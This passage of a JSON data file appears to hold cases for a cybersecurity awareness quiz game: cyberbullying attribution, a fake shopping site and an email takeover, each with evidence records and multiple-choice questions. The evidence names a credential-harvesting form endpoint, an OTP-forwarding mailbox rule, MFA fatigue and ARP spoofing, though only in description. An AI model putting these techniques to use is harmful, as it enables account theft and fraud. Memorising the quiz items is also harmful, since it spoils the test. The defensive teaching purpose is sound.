        "text": "What browser permission should users scrutinize before installing third-party extensions?",
        "options": [
          "'Read and change all your data on all websites'",
          "'Change browser theme color'",
          "'Play audio notifications'",
          "'Display notifications'"
        ]
      },
      {
        "text": "What action must the student take to ensure the stolen cookie 'session_id=8f91a...' is completely invalidated?",
        "options": [
          "Uninstall the browser and reinstall it",
          "Restart the Wi-Fi router",
          "Clear browser cache on the student's phone only",
          "Trigger 'Sign out of all sessions' or reset the master password to invalidate active token hashes on the server"
        ]
      },
      {
        "text": "How long did it take the adversary to exfiltrate the 2.1 GB archive?",
        "options": [
          "2 days",
          "3 hours",
          "Over a 4-minute window",
          "10 seconds"
        ]
      },
      {
        "text": "What proactive security measure prevents extension-based token theft in enterprise environments?",
        "options": [
          "Requiring users to type using only one hand",
          "Enterprise browser policies whitelisting strictly verified extensions and blocking unapproved third-party addons",
          "Deleting all browser history every 5 minutes",
          "Prohibiting students from using the internet"
        ]
      },
      {
        "text": "Synthesizing the complete attack timeline, what was the adversary's exact sequence of exploitation?",
        "options": [
          "Malicious extension installed -> Session cookie stolen -> Session injected in Brazil -> 2.1 GB archive downloaded -> Security alerts muted",
          "Session injected in Brazil -> Extension installed -> Security alerts muted -> 2.1 GB archive downloaded",
          "Security alerts muted -> 2.1 GB archive downloaded -> Session injected in Brazil -> Extension installed",
          "2.1 GB archive downloaded -> Extension installed -> Session injected in Brazil -> Security alerts muted"
        ]
      },
      {
        "text": "What is the full incident response plan required to clean and restore the student's digital environment?",
        "options": [
          "Install five more extensions to find the virus",
          "Delete all photos from the student's phone",
          "Simply close the browser window and restart the computer",
          "Remove the malicious extension, terminate all active sessions, reset password, enable app-based 2FA, and re-enable alert notifications"
        ]
      }
    ]
  },
  "case-11": {
    "id": "case-11",
    "name": "CASE 11 — CYBERBULLYING INVESTIGATION",
    "summary": "A student receives threatening messages through a social platform. Review the available evidence and identify the incident.",
    "evidence": [
      {
        "tag": "DIRECT MESSAGES",
        "time": "INCIDENT RECORD 01",
        "title": "ANONYMOUS HARASSMENT",
        "details": "Repeated targeted threatening messages received by victim from anonymous burner handle '@dark_spectre_99' over a 48-hour period."
      },
      {
        "tag": "METADATA TRACE",
        "time": "INCIDENT RECORD 02",
        "title": "CAMPUS WI-FI IP RANGE",
        "details": "Message delivery network telemetry traced the originating public IP to the college hostel Wi-Fi gateway (103.21.144.10) between 22:00 and 23:30."
      },
      {
        "tag": "NETWORK DHCP LOG",
        "time": "INCIDENT RECORD 03",
        "title": "MAC ADDRESS TIMING",
        "details": "Hostel router DHCP lease log correlates internal IP 192.168.4.88 to laptop MAC address 'FC:FB:FB:12:34:56' connected during the exact timestamps of harassment."
      },
      {
        "tag": "SECURITY REPORT",
        "time": "INCIDENT RECORD 04",
        "title": "PRESERVED CHAT TRANSCRIPTS",
        "details": "Victim properly captured timestamped screenshots showing full headers and message content without replying, escalating, or deleting evidence."
      }
    ],
    "round2Evidence": [
      {
        "tag": "CAMPUS ACCESS AUDIT",
        "time": "23:35:00 UTC",
        "title": "BIOMETRIC HOSTEL ENTRY CORRELATION",
        "details": "Hostel turnstile access logs confirm student 'Karthik R (Room 304)' checked into Block-B hostel at 21:45, remaining in the building throughout the harassment window."
      },
      {
        "tag": "DEVICE FINGERPRINT",
        "time": "23:42:15 UTC",
        "title": "HOSTNAME & MAC VENDOR MATCH",
        "details": "DHCP lease table records device hostname 'KARTHIK-DELL-G15' registered to MAC address 'FC:FB:FB:12:34:56' (Dell Inc. network interface)."
      },
      {
        "tag": "BROWSER FORENSICS",
        "time": "23:50:00 UTC",
        "title": "RECOVERED INCOGNITO ARTIFACTS",
        "details": "Forensic triage of the student's laptop identified browser cache SQLite records showing creation of ProtonMail account 'spectre_dark99@proton.me' 20 minutes before messages began."
      },
      {
        "tag": "DISCIPLINARY POLICY",
        "time": "00:05:00 UTC",
        "title": "CAMPUS IT CODE OF CONDUCT VIOLATION",
        "details": "The actions directly violate College IT Disciplinary Rule 4.2 (Prohibition of cyber harassment, cyber stalking, and unauthorized anonymous intimidation using campus networks)."
      }
    ],
    "questions": [
      {
        "text": "What anonymous handle was used to send the threatening messages?",
        "options": [
          "@college_official",
          "@dark_spectre_99",
          "@admin_user",
          "@friendly_student"
        ]
      },
      {
        "text": "What college network was the message delivery IP traced back to?",
        "options": [
          "The college hostel Wi-Fi gateway",
          "An international airport Wi-Fi",
          "The campus library desktop lab",
          "The principal's office"
        ]
      },
      {
        "text": "Between what hours of the evening did the network telemetry record the messages?",
        "options": [
          "12:00 and 01:00 PM",
          "03:00 and 04:00 AM",
          "06:00 and 07:00 AM",
          "22:00 and 23:30 (10:00 PM to 11:30 PM)"
        ]
      },
      {
        "text": "What physical network hardware address (MAC address) was identified in the DHCP lease log?",
        "options": [
          "AA:BB:CC:DD:EE:FF",
          "12:34:56:78:90:AB",
          "FC:FB:FB:12:34:56",
          "00:11:22:33:44:55"
        ]
      },
      {
        "text": "What internal private IP address was leased to the suspect's device during the harassment?",
        "options": [
          "172.16.0.2",
          "192.168.4.88",
          "127.0.0.1",
          "10.0.0.1"
        ]
      },
      {
        "text": "What crucial best practice did the victim follow regarding evidence preservation?",
        "options": [
          "Captured timestamped screenshots showing full headers and content without deleting or replying",
          "Threw their smartphone into water",
          "Deleted all messages immediately and restarted phone",
          "Replied back with threatening messages of their own"
        ]
      },
      {
        "text": "Over what time period were the repeated threatening messages received?",
        "options": [
          "6 months",
          "5 minutes only",
          "10 years",
          "A 48-hour period"
        ]
      },
      {
        "text": "What public IP address represented the college hostel Wi-Fi gateway?",
        "options": [
          "8.8.8.8",
          "1.1.1.1",
          "103.21.144.10",
          "192.168.1.1"
        ]
      },
      {
        "text": "Why is it important NOT to reply with insults or threats when receiving cyberbullying messages?",
        "options": [
          "Replying is illegal under traffic laws",
          "Replying escalates conflict, gives the bully satisfaction, and can muddy the legal evidence record",
          "Replying uses up extra mobile phone battery",
          "Replying breaks the smartphone screen"
        ]
      },
      {
        "text": "What network service assigns IP addresses to devices connected to a hostel Wi-Fi router?",
        "options": [
          "DHCP (Dynamic Host Configuration Protocol)",
          "SMTP",
          "FTP",
          "DNS"
        ]
      },
      {
        "text": "Can using an anonymous social media handle completely hide your identity on a campus network?",
        "options": [
          "Yes, Wi-Fi routers cannot see anonymous accounts",
          "Yes, usernames change the physical MAC address",
          "Yes, anonymous usernames make you 100% invisible to all routers",
          "No, network logs and DHCP lease records link connections to physical device hardware addresses"
        ]
      },
      {
        "text": "What authority on a college campus should cyberbullying incidents be formally reported to?",
        "options": [
          "The canteen food supplier",
          "The campus bus driver",
          "College Disciplinary Committee, Anti-Ragging Cell, or Campus Security",
          "The local library gardener"
        ]
      },
      {
        "text": "What does a MAC (Media Access Control) address represent on a computer?",
        "options": [
          "The password of the computer",
          "A unique physical hardware identifier assigned to the network interface card",
          "The speed of the processor in gigahertz",
          "The student's college roll number"
        ]
      },
      {
        "text": "Why are timestamped screenshots more valuable than simple forwarded text in cyber investigations?",
        "options": [
          "They preserve visual context, sender handle, profile pictures, and exact chronological timestamps",
          "They automatically delete the bully's social account",
          "They prove the victim owns the social media company",
          "They take up less storage space on memory cards"
        ]
      },
      {
        "text": "Even if an abuser deletes their account immediately after sending messages, can they still be identified?",
        "options": [
          "No, deleting an account instantly erases all router and server logs worldwide",
          "Only if the abuser confesses in person",
          "No, internet routers explode when an account is deleted",
          "Yes, server logs, gateway NAT records, and router DHCP history preserve connection records"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What device hostname was identified in the DHCP lease table for MAC 'FC:FB:FB:12:34:56'?",
        "options": [
          "KARTHIK-DELL-G15",
          "VIKRAM-HP-LAPTOP",
          "STUDENT-PC-01",
          "HOSTEL-DESKTOP"
        ]
      },
      {
        "text": "What hardware manufacturer was identified by the MAC address Organizationally Unique Identifier (OUI)?",
        "options": [
          "Apple Inc.",
          "HP Inc.",
          "Lenovo",
          "Dell Inc."
        ]
      },
      {
        "text": "Which student and room number were tied to the physical hostel entry turnstile log?",
        "options": [
          "Ramesh P (Room 215)",
          "Vikram K (Room 102)",
          "Karthik R (Room 304)",
          "Suresh S (Room 401)"
        ]
      },
      {
        "text": "What burner email address was discovered in the browser cache SQLite artifacts?",
        "options": [
          "drop_box_rec@proton.me",
          "spectre_dark99@proton.me",
          "shadow_relay_99@proton.me",
          "dark_user@gmail.com"
        ]
      },
      {
        "text": "How many minutes before the harassment began was the burner ProtonMail account created?",
        "options": [
          "20 minutes before",
          "After the harassment ended",
          "2 days before",
          "5 hours before"
        ]
      },
      {
        "text": "What specific institutional policy rule was violated according to the evidence?",
        "options": [
          "Hostel Library Rule 1.1",
          "Dress Code Policy 5",
          "Campus Parking Regulation 3",
          "College IT Disciplinary Rule 4.2 (Prohibition of cyber harassment and anonymous intimidation)"
        ]
      },
      {
        "text": "What is an OUI (Organizationally Unique Identifier) in digital forensics?",
        "options": [
          "The name of the user's internet service provider",
          "The version number of the web browser",
          "The first 3 bytes (24 bits) of a MAC address that identify the hardware vendor / manufacturer",
          "The serial number of the computer screen"
        ]
      },
      {
        "text": "Why do private/incognito browsing windows still leave forensic traces on local storage?",
        "options": [
          "Incognito mode only works on Sundays",
          "DNS resolver cache, crash dumps, and uncommitted SQLite journal buffers can persist in RAM and swap files",
          "Incognito windows automatically print all history to paper",
          "Incognito windows share history with all college classmates"
        ]
      },
      {
        "text": "How does correlating physical turnstile logs with digital DHCP timestamps establish culprit attribution?",
        "options": [
          "It proves the suspect was physically present inside the hostel while their registered laptop transmitted the packets",
          "It proves the student is good at video games",
          "It proves the suspect owns an iPhone",
          "It proves the hostel Wi-Fi was installed in 2026"
        ]
      },
      {
        "text": "What legal provisions under Indian Law apply to online stalking and intimidation of students?",
        "options": [
          "Income Tax Act Section 80C",
          "Customs Duty Act Section 14",
          "Consumer Protection Act Section 2",
          "Section 354D IPC (Stalking), Section 507 IPC (Criminal intimidation), and Section 66E/67 IT Act"
        ]
      },
      {
        "text": "Can MAC address spoofing be detected on an enterprise-managed wireless network?",
        "options": [
          "Only if the router has less than 4 antennas",
          "Only if the computer is painted black",
          "Yes, 802.1X user authentication, switch port security, and 802.11 frame sequence tracking expose anomalies",
          "No, spoofed MAC addresses are 100% undetectable by any equipment"
        ]
      },
      {
        "text": "What is the role of an Anti-Ragging / Disciplinary Committee during digital evidence review?",
        "options": [
          "To charge fines to all hostel students equally",
          "To review forensic evidence impartially, conduct fair hearings, and enforce institutional penalties or police referral",
          "To delete all college computer files",
          "To shut down the college for one year"
        ]
      },
      {
        "text": "Why is preserving unedited original digital files critical for police evidence admissibility under legal standards?",
        "options": [
          "To satisfy Certificate under Section 65B of the Indian Evidence Act (BSA Section 63) proving data integrity",
          "Because police only accept printed color photographs",
          "Because judges only read documents in Latin",
          "Because modified files cannot be opened by Microsoft Windows"
        ]
      },
      {
        "text": "Synthesizing the complete investigative dossier, what three independent evidence streams converge on the perpetrator?",
        "options": [
          "Classroom grades, sports medals, and library attendance",
          "Anonymous social media rumors, handwritten letters, and phone battery percentage",
          "Weather reports, electricity bills, and cafeteria receipts",
          "Digital network logs (MAC/hostname), physical biometric turnstile entry, and local browser cache artifacts"
        ]
      },
      {
        "text": "What institutional safeguards should the college implement to prevent malicious anonymous abuse of hostel networks?",
        "options": [
          "Completely disable Wi-Fi in all hostels permanently",
          "Allow anyone to connect without any password or logging",
          "Deploy 802.1X user-authenticated network access, enforce content safety policies, and conduct student digital ethics training",
          "Inspect all student phones manually every morning"
        ]
      }
    ]
  },
  "case-12": {
    "id": "case-12",
    "name": "CASE 12 — FAKE WEBSITE SCAM",
    "summary": "A website imitates a trusted service to collect user information. Identify the signs that reveal the fake website.",
    "evidence": [
      {
        "tag": "URL INSPECTION",
        "time": "INCIDENT RECORD 01",
        "title": "TYPOSQUATTED DOMAIN",
        "details": "Target URL: 'www.arnazon-prime-offers.com' utilizing letter combination 'rn' to visually mimic the letter 'm' in 'amazon'."
      },
      {
        "tag": "CERTIFICATE INFO",
        "time": "INCIDENT RECORD 02",
        "title": "FREE UNVERIFIED SSL",
        "details": "Domain registered 3 days ago through a privacy-protected registrar with a 90-day free Let's Encrypt automated DV certificate."
      },
      {
        "tag": "PAGE CONTENT",
        "time": "INCIDENT RECORD 03",
        "title": "UNREALISTIC 90% DISCOUNT",
        "details": "Page claims 'iPhone 15 Pro for ₹2,999' featuring an artificial countdown timer that resets to 15:00 on every browser page refresh."
      },
      {
        "tag": "PAYMENT GATEWAY",
        "time": "INCIDENT RECORD 04",
        "title": "DIRECT UPI QR INSTEAD OF GATEWAY",
        "details": "Checkout completely bypasses verified payment gateways (like Razorpay/BillDesk) and demands direct peer-to-peer UPI transfer to an unverified private QR code."
      }
    ],
    "round2Evidence": [
      {
        "tag": "HTML SOURCE AUDIT",
        "time": "17:15:30 UTC",
        "title": "CLONED ASSET SCRAPING",
        "details": "Source inspection reveals the website directly hotlinks CSS, product images, and customer reviews from the genuine Amazon CDN server to project authenticity."
      },
      {
        "tag": "FORM ACTION TRACE",
        "time": "17:22:00 UTC",
        "title": "EXFILTRATION TO FOREIGN POST ENDPOINT",
        "details": "Payment submission form 'form action' targets 'http://185.190.140.88/collector/steal_creds.php', transmitting credit card CVV and billing details to an offshore server."
      },
      {
        "tag": "SCRIPT ANALYSIS",
        "time": "17:30:15 UTC",
        "title": "FAKE REAL-TIME PURCHASE POPUPS",
        "details": "JavaScript file 'social-proof.js' contains hardcoded arrays generating fake notifications like 'Rahul from Delhi just bought an iPhone 10 seconds ago!' every 8 seconds."
      },
      {
        "tag": "WHOIS AUDIT",
        "time": "17:40:00 UTC",
        "title": "DISPOSABLE REGISTRAR DATA",
        "details": "WHOIS registrant listed as 'Privacy Protection Service Inc.' registered through a registrar based in Saint Kitts and Nevis with anonymous cryptocurrency payment."
      }
    ],
    "questions": [
      {
        "text": "What typosquatting trick was used in the URL 'www.arnazon-prime-offers.com'?",
        "options": [
          "Using the letters 'rn' placed side-by-side to visually mimic the letter 'm'",
          "Spelling Amazon backward",
          "Using numbers instead of letters",
          "Replacing Amazon with Google"
        ]
      },
      {
        "text": "How many days old was the fraudulent website domain according to the certificate info?",
        "options": [
          "10 years ago",
          "500 days ago",
          "1 month ago",
          "3 days ago"
        ]
      },
      {
        "text": "What absurd price was advertised for the iPhone 15 Pro on the scam page?",
        "options": [
          "Free of cost",
          "₹1,20,000",
          "₹2,999 (90% discount)",
          "₹80,000"
        ]
      },
      {
        "text": "What happened to the countdown timer whenever the user refreshed the webpage?",
        "options": [
          "It counted down to zero and locked the screen",
          "It reset back to 15:00 every time the page was refreshed",
          "It disappeared completely",
          "It displayed the actual current time in Delhi"
        ]
      },
      {
        "text": "What legitimate payment system was completely bypassed at checkout?",
        "options": [
          "Verified payment gateways (like Razorpay, BillDesk, or bank gateways)",
          "Barter exchange system",
          "Direct cash courier",
          "Gold coin payment"
        ]
      },
      {
        "text": "What did the scam checkout demand instead of a standard payment gateway?",
        "options": [
          "Credit card with zero CVV",
          "Signing a paper receipt",
          "Student roll number only",
          "Direct peer-to-peer UPI transfer to an unverified private QR code"
        ]
      },
      {
        "text": "What is this visual URL deception called when attackers register visually similar domains?",
        "options": [
          "Ransomware",
          "Buffer Overflow",
          "Typosquatting / Combosquatting",
          "Cross-Site Scripting"
        ]
      },
      {
        "text": "Does having a padlock icon (HTTPS) guarantee that an online shopping site is 100% trustworthy?",
        "options": [
          "Yes, HTTPS guarantees you will receive your ordered products",
          "No, HTTPS only means the connection is encrypted; anyone, including scammers, can get free SSL certificates",
          "Yes, scam websites are physically unable to use HTTPS",
          "Yes, a padlock icon means the police have verified the website owner"
        ]
      },
      {
        "text": "What psychological tactic was the fake 15-minute countdown timer designed to trigger?",
        "options": [
          "Artificial urgency and fear of missing out (FOMO) to prevent critical verification",
          "Sleepiness",
          "Scientific curiosity about clocks",
          "Patience and relaxation"
        ]
      },
      {
        "text": "What is the official domain of Amazon in India?",
        "options": [
          "www.amazon-cheap-sale.xyz",
          "www.amazon99.org",
          "www.arnazon-prime-offers.com",
          "www.amazon.in"
        ]
      },
      {
        "text": "Why should users be suspicious of consumer electronic deals offering 90% discounts on brand new phones?",
        "options": [
          "Because discounts are illegal in India",
          "Because brand new phones can only be bought at physical post offices",
          "Brand new flagship smartphones are never sold at 90% below manufacturing cost by legitimate retailers",
          "Because smartphones only cost ₹10 to manufacture"
        ]
      },
      {
        "text": "What certificate authority issued the free 90-day DV certificate in the evidence?",
        "options": [
          "DigiCert Extended Validation",
          "Let's Encrypt",
          "Government of India CA",
          "VeriSign Global"
        ]
      },
      {
        "text": "What should a shopper do if an online store demands payment to a private personal UPI QR code?",
        "options": [
          "Do not pay; close the website and report the fake storefront",
          "Send the payment immediately to secure the deal",
          "Send an email asking for their personal address",
          "Ask for a 50% discount on the UPI amount"
        ]
      },
      {
        "text": "Why do typosquatters target fonts where 'rn' looks identical to 'm'?",
        "options": [
          "Because search engines rank 'rn' higher than 'm'",
          "Because mobile phones cannot display the letter 'r'",
          "Because computer keyboards do not have the letter 'm'",
          "In sans-serif fonts on mobile screens, the letters 'r' and 'n' merge visually to form 'm'"
        ]
      },
      {
        "text": "What is the critical difference between a Domain Validation (DV) certificate and an Extended Validation (EV) certificate?",
        "options": [
          "DV certificates work only on computers, while EV works only on phones",
          "There is no difference between SSL certificates",
          "DV only proves automated control of the domain name; EV requires rigorous legal business identity verification",
          "DV certificates cost millions of dollars"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What IP address received the submitted credit card and billing credentials from the fake form?",
        "options": [
          "192.168.1.1",
          "10.0.0.1",
          "172.67.182.20",
          "185.190.140.88"
        ]
      },
      {
        "text": "What endpoint path was configured on the credential harvester server?",
        "options": [
          "/payment/process",
          "/checkout/confirm",
          "/collector/steal_creds.php",
          "/api/login"
        ]
      },
      {
        "text": "What technique did the scam website use to display authentic Amazon styling and high-resolution images?",
        "options": [
          "Using artificial intelligence to draw logos",
          "Direct CDN hotlinking to legitimate Amazon servers in their HTML source",
          "Hacking into Amazon's headquarters database",
          "Taking pictures of laptop screens with a camera"
        ]
      },
      {
        "text": "What JavaScript file generated the fake real-time purchase notification popups?",
        "options": [
          "social-proof.js",
          "payment.js",
          "bootstrap.js",
          "analytics.js"
        ]
      },
      {
        "text": "How frequently did the fake purchase popup trigger according to script analysis?",
        "options": [
          "Only when clicked",
          "Every 60 minutes",
          "Once a day",
          "Every 8 seconds"
        ]
      },
      {
        "text": "In which Caribbean jurisdiction was the domain registrar privacy service located?",
        "options": [
          "Jamaica",
          "Bermuda",
          "Saint Kitts and Nevis",
          "Bahamas"
        ]
      },
      {
        "text": "What psychological bias is exploited by automated 'social proof' purchase popups?",
        "options": [
          "Visual contrast bias",
          "Herd mentality / Bandwagon effect (believing others are actively buying safely)",
          "Auditory memory",
          "Confirmation bias about battery life"
        ]
      },
      {
        "text": "How can web developers prevent rogue third-party sites from hotlinking their brand CDN assets?",
        "options": [
          "Configure Cross-Origin Resource Sharing (CORS) and HTTP Referer access controls",
          "Make all images black and white",
          "Delete all images from the CDN",
          "Disable the internet during the night"
        ]
      },
      {
        "text": "Why did the form action target an unencrypted HTTP URL ('http://185.190.140.88/...') despite the main site having SSL?",
        "options": [
          "Because the victim's browser forced the change",
          "Because Russian servers do not support HTTPS",
          "Because credit card data cannot be sent over HTTPS",
          "The scammers deployed cheap SSL on the landing page for visual trust, but exfiltrated data directly to a raw backend IP"
        ]
      },
      {
        "text": "What browser security feature flags forms that submit sensitive data from HTTPS pages to insecure HTTP endpoints?",
        "options": [
          "Pop-up blocker sound",
          "Screen brightness auto-adjust",
          "Mixed Content / Insecure Form Submission browser warnings",
          "Dark mode inverter"
        ]
      },
      {
        "text": "What is the primary motive behind scammers purchasing domain registrations with anonymous cryptocurrency?",
        "options": [
          "Because registrars give a 90% discount for Bitcoin",
          "To prevent financial tracking and credit card identity linkage back to the perpetrator",
          "Because domain names can only be bought with crypto",
          "To speed up domain registration by 5 seconds"
        ]
      },
      {
        "text": "How can a consumer verify whether a specific shopping website is legally affiliated with a major brand?",
        "options": [
          "Navigate exclusively to verified official domains via bookmarks, official brand apps, or validated social handles",
          "Ask the website's live chat operator if they are real",
          "Check if the website has a copyright notice in the footer",
          "Trust the website if it appears as a sponsored ad on search engines"
        ]
      },
      {
        "text": "What threat classification does Google Safe Browsing and Microsoft SmartScreen assign to this domain?",
        "options": [
          "Educational Resource",
          "Government Verified Portal",
          "High Performance Website",
          "Deceptive Site / Phishing / Fraudulent Storefront warning"
        ]
      },
      {
        "text": "Reconstructing the deceptive web page architecture, what four technical components created the illusion of legitimacy?",
        "options": [
          "Physical retail store, television broadcast, printed newspaper coupon, and billboard ad",
          "Operating system kernel, graphics driver, sound card, and USB port",
          "Typosquatted domain name, free DV SSL padlock, CDN hotlinked assets, and automated social proof popups",
          "Database encryption, VPN tunnel, proxy gateway, and firewall configuration"
        ]
      },
      {
        "text": "What systemic domain governance measure can trademark owners employ to protect their consumers from typosquatting?",
        "options": [
          "Lowering prices of real products to match the scam",
          "Defensive domain registration of common typos, Brand Protection monitoring, and filing UDRP domain disputes",
          "Asking search engines to shut down the internet",
          "Suing all domain registrars in the world"
        ]
      }
    ]
  },
  "case-13": {
    "id": "case-13",
    "name": "CASE 13 — STOLEN EMAIL ACCOUNT",
    "summary": "A user can no longer access their email account. Investigate the clues surrounding the account takeover.",
    "evidence": [
      {
        "tag": "LOGIN FAILURE",
        "time": "INCIDENT RECORD 01",
        "title": "PASSWORD REJECTED",
        "details": "User prompted: 'Password changed 2 hours ago.' Recovery phone number replaced with unknown mobile number ending in 'XX89'."
      },
      {
        "tag": "INBOX FORWARDING",
        "time": "INCIDENT RECORD 02",
        "title": "AUTO-FORWARDING RULE",
        "details": "Attacker created a hidden filter rule forwarding all incoming mail with subject containing 'bank', 'OTP', or 'statement' to 'relay_drop77@proton.me'."
      },
      {
        "tag": "RECENT ACTIVITY",
        "time": "INCIDENT RECORD 03",
        "title": "PUBLIC WI-FI SNOOPING",
        "details": "User logged into email account yesterday on an open, unencrypted coffee shop Wi-Fi network without a VPN or device firewall."
      },
      {
        "tag": "ALERT LOG",
        "time": "INCIDENT RECORD 04",
        "title": "FAILED 2FA PROMPTS",
        "details": "User received multiple 2FA approval prompts on phone yesterday afternoon and accidentally tapped 'Yes, it was me' to dismiss the annoying notifications."
      }
    ],
    "round2Evidence": [
      {
        "tag": "ATTACK TECHNIQUE",
        "time": "18:20:15 UTC",
        "title": "MFA FATIGUE ATTACK (PROMPT BOMBING)",
        "details": "Authentication telemetry logs 42 push authorization requests sent to the victim's mobile device within an 8-minute period until accidental user approval."
      },
      {
        "tag": "NETWORK CAPTURE",
        "time": "18:25:30 UTC",
        "title": "COFFEE SHOP ARP SPOOFING",
        "details": "Wireshark PCAP analysis on the public coffee shop AP confirms an active ARP cache poisoning attack redirecting gateway traffic through MAC 'B8:27:EB:11:22:33'."
      },
      {
        "tag": "PIVOT FRAUD",
        "time": "18:35:00 UTC",
        "title": "LINKED SERVICE PASSWORD RESETS",
        "details": "Within 45 minutes of email takeover, attacker initiated password resets for victim's linked cryptocurrency exchange, online banking, and PayPal accounts."
      },
      {
        "tag": "API PERSISTENCE",
        "time": "18:42:10 UTC",
        "title": "ROGUE APP TOKEN GENERATION",
        "details": "Attacker generated an OAuth 2.0 offline refresh token for rogue desktop client 'SyncHelper_v1', maintaining access even if the web password is changed."
      }
    ],
    "questions": [
      {
        "text": "What message appeared on the screen when the user attempted to log in?",
        "options": [
          "Server under maintenance",
          "Account deleted permanently",
          "Incorrect username",
          "Password changed 2 hours ago"
        ]
      },
      {
        "text": "What two digits did the attacker's new recovery phone number end in?",
        "options": [
          "XX12",
          "XX99",
          "XX89",
          "XX00"
        ]
      },
      {
        "text": "What hidden rule did the attacker configure inside the victim's inbox?",
        "options": [
          "A rule that deletes all photos on the computer",
          "An auto-forwarding rule sending emails with 'bank', 'OTP', or 'statement' to an external mailbox",
          "A rule that translates all emails into German",
          "A rule that prints every incoming email on paper"
        ]
      },
      {
        "text": "To which email address were incoming banking and OTP emails secretly forwarded?",
        "options": [
          "relay_drop77@proton.me",
          "admin@google.com",
          "student@college.edu",
          "helpdesk@yahoo.com"
        ]
      },
      {
        "text": "Where had the user logged into their email yesterday without using a VPN?",
        "options": [
          "The college computer lab",
          "Their home broadband",
          "A police station network",
          "An open, unencrypted coffee shop Wi-Fi network"
        ]
      },
      {
        "text": "What fatal mistake did the user make when receiving repeated 2FA prompts on their phone?",
        "options": [
          "Blocked the number immediately",
          "Turned off their phone screen",
          "Tapped 'Yes, it was me' to dismiss the annoying notifications",
          "Called their college professor"
        ]
      },
      {
        "text": "What attack technique involves flooding a user with continuous 2FA prompts until they approve?",
        "options": [
          "SQL Injection",
          "MFA Fatigue / Prompt Bombing",
          "Cross-Site Scripting",
          "Buffer Overflow"
        ]
      },
      {
        "text": "Why is public, unencrypted Wi-Fi dangerous for sensitive account logins?",
        "options": [
          "Anyone on the same local network can intercept unencrypted data packets and execute eavesdropping attacks",
          "Public Wi-Fi charges ₹1,000 per minute",
          "Public Wi-Fi only connects to foreign websites",
          "Public Wi-Fi disables the phone's battery"
        ]
      },
      {
        "text": "What tool encrypts your internet traffic when connecting to untrusted public Wi-Fi networks?",
        "options": [
          "A Bluetooth speaker",
          "A USB mouse",
          "A bigger computer screen",
          "A Virtual Private Network (VPN)"
        ]
      },
      {
        "text": "What should you do if your phone suddenly receives 2FA push prompts that you did not initiate?",
        "options": [
          "Turn the phone off and ignore it",
          "Forward the prompt to friends",
          "Tap 'NO, IT'S NOT ME', change your master password immediately, and review active sessions",
          "Tap 'Yes' to make the prompt go away"
        ]
      },
      {
        "text": "Why do attackers target a victim's primary email account first?",
        "options": [
          "Because email servers are turned off on weekends",
          "Primary email is the master key to reset passwords for banking, social media, and crypto accounts",
          "Because email is the slowest internet service",
          "To read the student's homework notes"
        ]
      },
      {
        "text": "What security mechanism requires you to enter a matching 2-digit number displayed on the login screen?",
        "options": [
          "Number Matching in Authenticator Apps",
          "Password hint",
          "Captcha audio",
          "Email signature"
        ]
      },
      {
        "text": "What should the user check inside their email settings immediately after recovering access?",
        "options": [
          "The total number of sent emails",
          "The font size of the inbox",
          "The color of the compose button",
          "Filters & Forwarding rules, connected third-party apps, and recovery phone/email settings"
        ]
      },
      {
        "text": "Why did the attacker create an auto-forwarding rule instead of simply checking the inbox manually?",
        "options": [
          "Attackers are not allowed to open web browsers",
          "Email servers do not allow manual reading",
          "Forwarding operates silently in the background, exfiltrating OTPs even if the attacker is not actively logged in",
          "Forwarding rules increase the speed of the internet"
        ]
      },
      {
        "text": "What makes simple 'Yes/No' 2FA push notifications vulnerable compared to hardware FIDO2 security keys?",
        "options": [
          "FIDO2 security keys require a phone number",
          "Push notifications can be accidentally approved under fatigue; FIDO2 hardware keys require physical touch and cryptographic origin binding",
          "Hardware keys are easily hacked over Wi-Fi",
          "Push notifications only work on desktop computers"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "How many push authorization requests were flooded to the victim's phone in 8 minutes?",
        "options": [
          "2 requests",
          "500 requests",
          "42 requests",
          "10 requests"
        ]
      },
      {
        "text": "What network attack was executed on the public coffee shop AP to intercept gateway traffic?",
        "options": [
          "BGP Hijacking",
          "ARP Cache Poisoning / ARP Spoofing",
          "DNS Amplification",
          "SQL Injection"
        ]
      },
      {
        "text": "What MAC address was identified as the rogue attacker device poisoning the coffee shop ARP table?",
        "options": [
          "B8:27:EB:11:22:33 (Raspberry Pi Foundation)",
          "FC:FB:FB:12:34:56",
          "AA:BB:CC:DD:EE:FF",
          "00:11:22:33:44:55"
        ]
      },
      {
        "text": "How quickly after the email takeover were password resets initiated for banking and crypto accounts?",
        "options": [
          "Never",
          "After 2 weeks",
          "After 1 year",
          "Within 45 minutes"
        ]
      },
      {
        "text": "What rogue application token was generated by the attacker to retain API persistence?",
        "options": [
          "BackupHelper_v9",
          "EmailViewer_App",
          "SyncHelper_v1 (OAuth 2.0 offline refresh token)",
          "CryptoMiner_v2"
        ]
      },
      {
        "text": "How does ARP Cache Poisoning allow an attacker on local Wi-Fi to intercept network traffic?",
        "options": [
          "By physically cutting the internet cable with scissors",
          "By broadcasting forged ARP replies linking the router's IP to the attacker's MAC address, making traffic route through them",
          "By changing the Wi-Fi password for all users",
          "By turning off the coffee shop electricity"
        ]
      },
      {
        "text": "Why does an OAuth 2.0 offline refresh token provide persistent access even after a password reset?",
        "options": [
          "Refresh tokens remain valid until explicitly revoked in third-party connected app security settings",
          "Refresh tokens are stored on the user's SIM card",
          "Passwords have no relationship to email security",
          "Refresh tokens never expire on Google servers"
        ]
      },
      {
        "text": "What hardware device is identified by the MAC OUI prefix 'B8:27:EB'?",
        "options": [
          "Intel Corporation",
          "Apple Inc.",
          "Cisco Systems",
          "Raspberry Pi Foundation"
        ]
      },
      {
        "text": "What feature introduced in Microsoft Authenticator and Google Prompts specifically defeats MFA fatigue?",
        "options": [
          "Vibrating every 2 seconds",
          "Flashing phone screen colors",
          "Number Matching (requiring the user to enter the 2-digit number shown on the login terminal)",
          "Louder ringtones"
        ]
      },
      {
        "text": "Why did the attacker pivot to password resets on cryptocurrency and banking services immediately?",
        "options": [
          "Because banks require email accounts to open on Sundays",
          "Financial accounts often use email verification as the primary recovery channel for account takeovers",
          "Because email servers are connected to bank vaults",
          "To send holiday greetings to bank managers"
        ]
      },
      {
        "text": "How can users detect hidden mailbox rules in Outlook or Gmail web settings?",
        "options": [
          "Navigate to Settings -> Mail -> Rules / Filters and check for forwarding conditions matching keywords like OTP/Bank",
          "Change the email font to italics",
          "Restart the computer 3 times",
          "Check the desktop recycling bin"
        ]
      },
      {
        "text": "What is the primary network defense that protects users from ARP poisoning on public hotspots?",
        "options": [
